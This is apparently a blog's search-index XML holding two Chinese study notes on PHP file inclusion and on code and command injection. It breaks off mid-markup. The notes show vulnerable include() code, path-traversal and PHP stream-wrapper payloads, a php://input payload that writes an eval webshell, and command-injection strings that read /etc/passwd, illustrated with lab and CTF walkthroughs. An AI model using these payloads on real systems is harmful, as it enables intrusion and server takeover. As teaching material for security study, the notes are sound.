<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>31WEB漏洞-文件操作之文件包含漏洞全解</title>
      <link href="/2021/09/21/31WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/"/>
      <url>/2021/09/21/31WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h3 id="什么是文件包含"><a href="#什么是文件包含" class="headerlink" title="什么是文件包含"></a>什么是文件包含</h3><p>为了更好的使用代码的重用性，引入了文件包含函数，可以通过文件包含函数将文件包含进来，直接使用包含文件的代码。</p><span id="more"></span><h3 id="文件包含产生原因"><a href="#文件包含产生原因" class="headerlink" title="文件包含产生原因"></a>文件包含产生原因</h3><p>在包含文件时候，为了灵活包含文件，将包含文件设置为变量，通过动态变量引入需要包含的文件时，用户可以通过控制变量，而服务器端没有校验变量，从而导致文件包含漏洞，通常此漏洞出现在PHP中。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">.......</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h3><ul><li>include</li><li>include_once</li><li>require</li><li>require_once</li></ul><p>include （或 require）语句会获取指定文件中存在的所有文本/代码/标记，并复制到使用 include 语句的文件中。</p><p>include 和 require 语句是相同的，除了错误处理方面：</p><ul><li>require 会生成致命错误（E_COMPILE_ERROR）并停止脚本</li><li>include 只生成警告（E_WARNING），并且脚本会继续</li></ul><p>include_once 函数会将指定的文件载入并执行里面的程序；此行为和 include 语句类似，唯一区别是如果该文件中已经被包含过，则不会再次包含。</p><p>require_once也是一样的，当处理到错误的时候，require_once会停止脚本，include_once不会。</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>文件包含代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$filename=$_GET[&#x27;filename&#x27;];</span><br><span class="line">include($filename);</span><br><span class="line">/*</span><br><span class="line">$filename=$_GET[&#x27;filename&#x27;];</span><br><span class="line">include($filename.&quot;.html&quot;);</span><br><span class="line">*/</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109210854089.png" alt="image-20210921085420989"></p><p>本来文件是txt的文本</p><p>但是通过文件包含能够执行其中的代码</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109210854530.png" alt="image-20210921085433419"></p><h3 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h3><h4 id="白盒"><a href="#白盒" class="headerlink" title="白盒"></a>白盒</h4><p>代码审计</p><h4 id="黑盒"><a href="#黑盒" class="headerlink" title="黑盒"></a>黑盒</h4><ul><li>漏扫工具</li><li>公开漏洞</li><li>手工看参数值及功能</li></ul><h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><p>文件和网站在一个服务器上，类似像127.0.0.1/?file=../../phpinfo.php这样就属于本地文件包含</p><h4 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h4><h5 id="无限制"><a href="#无限制" class="headerlink" title="无限制"></a>无限制</h5><p>因为1.txt在根目录下，而test/php和她有2级目录，所有需要../退俩次目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/123/upload/test.php?filename=../../1.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109210854942.png" alt="image-20210921085443882"></p><h5 id="有限制"><a href="#有限制" class="headerlink" title="有限制"></a>有限制</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$filename=$_GET[&#x27;filename&#x27;];</span><br><span class="line">include($filename.&quot;.html&quot;);</span><br></pre></td></tr></table></figure><p>include会在filename后面添加一个.<code>html</code>。</p><p><strong>%00截断绕过</strong></p><p>利用条件</p><ul><li>magic_quotes_gpc = Off</li><li>php版本&lt;5.3.4</li></ul><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109210852172.png" alt="image-20210914210252910"></p><p><strong>长度截断绕过</strong></p><p>利用条件</p><p>windows，点号需要长于250;linux长于4096</p><p>好像绕过不去了。。。。。。。</p><h3 id="远程文件包含-危害更大"><a href="#远程文件包含-危害更大" class="headerlink" title="远程文件包含(危害更大)"></a>远程文件包含(危害更大)</h3><p>文件和网站不在一个服务器上，类似像127.0.0.1/?file=<a href="http://www.baidu.com这样就属于远程文件包含./">www.baidu.com这样就属于远程文件包含。</a></p><h4 id="类型-1"><a href="#类型-1" class="headerlink" title="类型"></a>类型</h4><p><strong>前提条件</strong></p><ul><li>allow_url_fopen：为ON时，能读取远程文件，例如file_get_contents()就能读取远程文件</li><li>allow_url_include:为ON时，就可以使用include和require的方式包含远程文件。</li></ul><p><strong>无限制</strong></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109210852180.png" alt="image-20210914211218583"></p><p>如果远程代码时后门，我们就可以通过远程文件包含从而获取webshell。</p><p><strong>有限制</strong></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109210855217.png" alt="image-20210921085504128"></p><p>通过在后面增加特殊符号来绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%20、%23、?</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109210855702.png" alt="image-20210921085513609"></p><h3 id="各种协议流的玩法"><a href="#各种协议流的玩法" class="headerlink" title="各种协议流的玩法"></a>各种协议流的玩法</h3><h3 id="PHP伪协议总结"><a href="#PHP伪协议总结" class="headerlink" title="PHP伪协议总结"></a>PHP伪协议总结</h3><h4 id="file-协议"><a href="#file-协议" class="headerlink" title="file:// 协议"></a><code>file://</code> 协议</h4><h5 id="使用条件："><a href="#使用条件：" class="headerlink" title="使用条件："></a>使用条件：</h5><ul><li><code>allow_url_fopen</code>:off/on</li><li><code>allow_url_fopen</code>:off/on</li></ul><h5 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h5><p>用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响。<br><code>include()/require()/include_once()/require_once()</code>参数可控的情况下，如导入为非<code>.php</code>文件，则仍按照php语法进行解析，这是<code>include()</code>函数所决定的。</p><h5 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h5><p><em>文件系统</em> 是 PHP 使用的默认封装协议，展现了本地文件系统。   当指定了一个相对路径（不以/、\、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。   在很多情况下是脚本所在的目录，除非被修改了。   使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 <a href="https://www.php.net/manual/zh/function.fopen.php">fopen()</a> 和 <a href="https://www.php.net/manual/zh/function.file-get-contents.php">file_get_contents()</a>，   <code>include_path</code> 会可选地搜索，也作为相对的路径。  </p><h5 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/path/to/file.ext</span><br><span class="line">relative/path/to/file.ext</span><br><span class="line">fileInCwd.ext</span><br><span class="line">C:/path/to/winfile.ext</span><br><span class="line">C:\path\to\winfile.ext</span><br><span class="line">\\smbserver\share\path\to\winfile.ext</span><br><span class="line">file:///path/to/file.ext</span><br></pre></td></tr></table></figure><h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><p>1.file://[文件的绝对路径和文件名]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/upload-labs/include.php?file=file://D:\phpstudy\www\phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109210855507.png" alt="image-20210921085524443"></p><p>2.[文件的相对路径和文件名]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/upload-labs/include.php?file=../phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109210852850.png" alt="image-20210321183305055"></p><p>3.[http：//网络路径和文件名]</p><p>这里进行远程访问的时候需要<code>allow_url_include=On</code>模式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/upload-labs/include.php?file=http://127.0.0.1/phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109210855978.png" alt="image-20210921085534907"></p><h4 id="php-协议"><a href="#php-协议" class="headerlink" title="php:// 协议"></a>php:// 协议</h4><ul><li><h5 id="条件："><a href="#条件：" class="headerlink" title="条件："></a>条件：</h5><ul><li><code>allow_url_fopen</code>:off/on</li><li><code>allow_url_include</code> :仅<code>php://input php://stdin php://memory php://temp </code>需要on</li></ul></li><li><h5 id="作用："><a href="#作用：" class="headerlink" title="作用："></a>作用：</h5><p><code>php://</code> 访问各个输入/输出流（I/O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于<strong>读取源码</strong>，<code>php://input</code>用于<strong>执行php代码</strong>。</p></li><li><h5 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h5><p>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，<br>内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p><table><thead><tr><th>协议</th><th align="left">作用</th></tr></thead><tbody><tr><td>php://input</td><td align="left">可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype=&quot;multipart/form-data&quot;</code> 的时候<code>php://input </code>是无效的。</td></tr><tr><td>php://output</td><td align="left">只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td></tr><tr><td>php://fd</td><td align="left">(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 <code>php://fd/3</code> 引用了文件描述符 3。</td></tr><tr><td>php://memory php://temp</td><td align="left">(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 <code>2MB</code>）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。</td></tr><tr><td>php://filter</td><td align="left">(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</td></tr></tbody></table></li><li><h5 id="php-filter-参数详解"><a href="#php-filter-参数详解" class="headerlink" title="php://filter  参数详解"></a>php://filter  参数详解</h5><p>该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：</p><table><thead><tr><th>php://filter 参数</th><th>描述</th><th></th></tr></thead><tbody><tr><td>resource=&lt;要过滤的数据流&gt;</td><td>必须项。它指定了你要筛选过滤的数据流。</td><td></td></tr><tr><td>read=&lt;读链的过滤器&gt;</td><td>可选项。可以设定一个或多个过滤器名称，以管道符（*\</td><td>*）分隔。</td></tr><tr><td>write=&lt;写链的过滤器&gt;</td><td>可选项。可以设定一个或多个过滤器名称，以管道符（\</td><td>）分隔。</td></tr><tr><td>&lt;; 两个链的过滤器&gt;</td><td>任何没有以 <em>read=</em> 或 <em>write=</em> 作前缀的筛选器列表会视情况应用于读或写链。</td><td></td></tr></tbody></table></li><li><h5 id="可用的过滤器列表（4类）"><a href="#可用的过滤器列表（4类）" class="headerlink" title="可用的过滤器列表（4类）"></a>可用的过滤器列表（4类）</h5><p>此处列举主要的过滤器类型，详细内容请参考：<a href="https://www.php.net/manual/zh/filters.php">https://www.php.net/manual/zh/filters.php</a></p><table><thead><tr><th>字符串过滤器</th><th>作用</th></tr></thead><tbody><tr><td>string.rot13</td><td>等同于<code>str_rot13()</code>，rot13变换</td></tr><tr><td>string.toupper</td><td>等同于<code>strtoupper()</code>，转大写字母</td></tr><tr><td>string.tolower</td><td>等同于<code>strtolower()</code>，转小写字母</td></tr><tr><td>string.strip_tags</td><td>等同于<code>strip_tags()</code>，去除html、PHP语言标签</td></tr></tbody></table><table><thead><tr><th>转换过滤器</th><th>作用</th></tr></thead><tbody><tr><td>convert.base64-encode &amp; convert.base64-decode</td><td>等同于<code>base64_encode()</code>和<code>base64_decode()</code>，base64编码解码</td></tr><tr><td>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td><td>quoted-printable 字符串与 8-bit 字符串编码解码</td></tr></tbody></table><table><thead><tr><th>压缩过滤器</th><th>作用</th></tr></thead><tbody><tr><td>zlib.deflate &amp; zlib.inflate</td><td>在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</td></tr><tr><td>bzip2.compress &amp; bzip2.decompress</td><td>同上，在本地文件系统中创建 bz2 兼容文件的方法。</td></tr></tbody></table><table><thead><tr><th>加密过滤器</th><th>作用</th></tr></thead><tbody><tr><td>mcrypt.*</td><td>libmcrypt 对称加密算法</td></tr><tr><td>mdecrypt.*</td><td>libmcrypt 对称解密算法</td></tr></tbody></table></li><li><p><strong>示例</strong>：</p><ol><li><p><code>php://filter/read=convert.base64-encode/resource=[文件名]</code>读取文件源码（针对php文件需要base64编码）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</span><br></pre></td></tr></table></figure></li><li><p><code>php://input + [POST DATA]</code>执行php代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://input</span><br><span class="line">[POST DATA部分]</span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure><p>若有写入权限，写入一句话木马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://input</span><br><span class="line">[POST DATA部分]</span><br><span class="line">&lt;?php fputs(fopen(&#x27;1juhua.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;); ?&gt;</span><br></pre></td></tr></table></figure></li></ol></li><li><p><strong>参考</strong>：<a href="https://php.net/manual/zh/wrappers.php.php">https://php.net/manual/zh/wrappers.php.php</a></p></li></ul><h4 id="zip-amp-bzip2-amp-zlib-协议"><a href="#zip-amp-bzip2-amp-zlib-协议" class="headerlink" title="zip:// &amp; bzip2:// &amp; zlib:// 协议"></a>zip:// &amp; bzip2:// &amp; zlib:// 协议</h4><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:off/on</li><li><code>allow_url_include</code> :off/on</li></ul></li><li><p><strong>作用</strong>：<code>zip:// &amp; bzip2:// &amp; zlib://</code> 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：<code>jpg png gif xxx</code> 等等。  </p></li><li><p><strong>示例</strong>：</p><ol><li><p><code>zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]</code>（#编码为%23）</p><p>压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt</span><br></pre></td></tr></table></figure></li><li><p><code>compress.bzip2://file.bz2</code></p><p>压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2</span><br></pre></td></tr></table></figure></li><li><p><code>compress.zlib://file.gz</code></p><p>压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz</span><br></pre></td></tr></table></figure></li></ol></li><li><p><strong>参考</strong>：<a href="http://php.net/manual/zh/wrappers.compression.php">http://php.net/manual/zh/wrappers.compression.php</a></p></li></ul><h4 id="data-协议"><a href="#data-协议" class="headerlink" title="data://协议"></a>data://协议</h4><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:on</li><li><code>allow_url_include</code> :on</li></ul></li><li><p><strong>作用</strong>：自<code>PHP&gt;=5.2.0</code>起，可以使用<code>data://</code>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p></li><li><p><strong>用法</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,</span><br><span class="line">data://text/plain;base64,</span><br></pre></td></tr></table></figure></li><li><p><strong>示例</strong>：</p><ol><li><p><code>data://text/plain,</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span><br></pre></td></tr></table></figure></li><li><p><code>data://text/plain;base64,</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure></li></ol></li></ul><h4 id="http-amp-https-协议"><a href="#http-amp-https-协议" class="headerlink" title="http:// &amp; https://协议"></a>http:// &amp; https://协议</h4><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:on</li><li><code>allow_url_include</code> :on</li></ul></li><li><p><strong>作用</strong>：常规 URL 形式，允许通过 <code>HTTP 1.0</code> 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。</p></li><li><p><strong>用法</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://example.com</span><br><span class="line">http://example.com/file.php?var1=val1&amp;var2=val2</span><br><span class="line">http://user:password@example.com</span><br><span class="line">https://example.com</span><br><span class="line">https://example.com/file.php?var1=val1&amp;var2=val2</span><br><span class="line">https://user:password@example.com</span><br></pre></td></tr></table></figure></li><li><p><strong>示例</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</span><br></pre></td></tr></table></figure></li></ul><h4 id="phar-协议"><a href="#phar-协议" class="headerlink" title="phar://协议"></a>phar://协议</h4><p><code>phar://</code>协议与<code>zip://</code>类似，同样可以访问zip格式压缩包内容，在这里只给出一个示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt</span><br></pre></td></tr></table></figure><p>另外在 Black Hat 2018 大会上，研究人员公布了一款针对PHP应用程序的全新攻击技术：<strong>phar://协议对象注入技术</strong>。</p><p>因为该利用点需要满足一定的条件才能利用，可以参考下面这篇文章，里面的demo也非常详细，留作以后专门研究一下。</p><blockquote><p>参考文章：<a href="https://paper.seebug.org/680/">seebug - 利用 phar 拓展 php 反序列化漏洞攻击面</a></p></blockquote><h3 id="涉及资源："><a href="#涉及资源：" class="headerlink" title="涉及资源："></a>涉及资源：</h3><ul><li><a href="https://www.seebug.org/vuldb/ssvid-98122">https://www.seebug.org/vuldb/ssvid-98122</a></li><li><a href="https://www.ichunqiu.com/battalion?t=1&amp;r=57475">https://www.ichunqiu.com/battalion?t=1&amp;r=57475</a></li><li><a href="https://blog.csdn.net/Cheng_May/article/details/78600833">https://blog.csdn.net/Cheng_May/article/details/78600833</a></li><li><a href="https://buuoj.cn/challenges#%5BRoarCTF%202019%5DEasy%20Java">https://buuoj.cn/challenges#%5BRoarCTF%202019%5DEasy%20Java</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 小迪学习笔记 </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>30WEB漏洞--代码及命令执行</title>
      <link href="/2021/09/12/30Web%E6%BC%8F%E6%B4%9E-%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2021/09/12/30Web%E6%BC%8F%E6%B4%9E-%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在 Web 应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用 代码或命令执行函数去处理。比如当应用在调用一些能将字符串转化成代 码的函数时，没有考虑用户是否能控制这个字符串，将造成代码执行漏 洞。同样调用系统命令处理，将造成命令执行漏洞。</p><span id="more"></span><h3 id="代码执行-RCE-漏洞"><a href="#代码执行-RCE-漏洞" class="headerlink" title="代码执行 RCE 漏洞"></a>代码执行 RCE 漏洞</h3><h4 id="形成"><a href="#形成" class="headerlink" title="形成"></a>形成</h4><ul><li>可控变量</li><li>漏洞函数</li></ul><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>会将我们输入的数据当做代码来执行，如果我们当前的网站是PHP就当做PHP语言来执行。</p><h4 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h4><p><strong>白盒</strong></p><ul><li>代码审计</li></ul><p><strong>黑盒</strong></p><ul><li>漏扫工具</li><li>公开漏洞</li><li>手工看参数值及功能点</li></ul><h4 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval()</span><br></pre></td></tr></table></figure><p>将输入的字符串当做PHP代码执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert()</span><br></pre></td></tr></table></figure><p>会检查指定的 assertion 并在结果为 FALSE 时采取适当的行动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func()</span><br></pre></td></tr></table></figure><p>把第一参数作为回调函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array()</span><br></pre></td></tr></table></figure><p>调用回到函数,并把第一个数组参数作为回到函数的参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_map()</span><br></pre></td></tr></table></figure><p>为数组的每个元素应用回调函数</p><h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><ul><li>敏感函数禁用</li><li>变量过滤或固定</li><li>WAF产品</li></ul><h4 id="案例演示"><a href="#案例演示" class="headerlink" title="案例演示"></a>案例演示</h4><p>这题是一个白盒测试，需要代码审计</p><p><img src="https://p.pstatp.com/origin/pgc-image/0c00ea242aa74405bb4f687222e06941"></p><p>该代码是将一个字符串进行解密，然后执行脚本命令</p><p><img src="https://p.pstatp.com/origin/pgc-image/0611a988ad1d4e4daabfbf11a4064d65"></p><p>解密后发现是接收一个a参数</p><p>直接使用<code>?a=ls</code>执行命令</p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><h4 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h4><ul><li>linux</li><li>windows</li></ul><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>应用在调用这些函数执行系统命令的时候，如果将用户的输入作为系统命令的参数拼接到命令行中，在没有过滤用户的输入的情况下，就会造成命令执行漏洞。</p><h4 id="形成-1"><a href="#形成-1" class="headerlink" title="形成"></a>形成</h4><ul><li>可控变量</li><li>漏洞函数</li></ul><h4 id="命令拼接"><a href="#命令拼接" class="headerlink" title="命令拼接"></a>命令拼接</h4><p>Linux</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">A;B A 不论正确与否都会执行 B</span><br><span class="line">A&amp;B A 后台运行，A 和 B 同时执行</span><br><span class="line">A&amp;&amp;B A 执行成功时候才会执行 B 命令</span><br><span class="line">A|B A 执行的输出结果，作为 B 命令的参数，A 不论正确与否都会执行 B 命令</span><br><span class="line">A||B A 执行失败后才会执行 B 命令</span><br><span class="line">``    反单引号linux下会当做命令来执行</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">127.0.0.1 ; cat /etc/passwd </span><br><span class="line">127.0.0.1 &amp; cat /etc/passwd </span><br><span class="line">127.0.0.1 &amp;&amp; cat /etc/passwd </span><br><span class="line">127.0.0.1 | cat /etc/passwd </span><br><span class="line">233 || cat /etc/passwd</span><br></pre></td></tr></table></figure><p>windows</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;|&quot;: 直接执行后面的语句。</span><br><span class="line">&quot;||&quot;: 如果前面的语句执行失败，则执行后面的语句，前面的语句只能为假才行。</span><br><span class="line">&quot;&amp;&quot;：两条命令都执行，如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。</span><br><span class="line">&quot;&amp;&amp;&quot;：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执    行,前面的语句只能为真。</span><br></pre></td></tr></table></figure><h4 id="php相关函数"><a href="#php相关函数" class="headerlink" title="php相关函数"></a>php相关函数</h4><ul><li>system(args) 有回显</li><li>passthru(args)(有回显)</li><li>exec(args) （回显最后一行-必须echo输出）</li><li>shell_exec(args) （无回显-必须输出）</li><li>反引号：``</li><li>popen(handle,mode)(无回显)</li><li>proc_open(‘cmd’,‘flag’,‘flag’)（无回显）</li><li>$process = proc_open(‘dir’,$des,$pipes);</li><li>echo stream_get_contents($pipes[1]); </li></ul><h4 id="案例演示-1"><a href="#案例演示-1" class="headerlink" title="案例演示"></a>案例演示</h4><p>墨者命令注入执行分析</p><p>通过抓包绕过前端js检测。使用<code>;</code>进行命令拼接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iipp=127.0.0.1;ls&amp;submit=Ping</span><br></pre></td></tr></table></figure><p><img src="https://p.pstatp.com/origin/pgc-image/75a742c9a3a1492d9df791080b8a3a83"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iipp=127.0.0.1;cat&lt;key_21071211676104.php&amp;submit=Ping</span><br></pre></td></tr></table></figure><p>成功获取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mozhe1af4b8cc599a0a837919be1d30d</span><br></pre></td></tr></table></figure><h3 id="涉及资源："><a 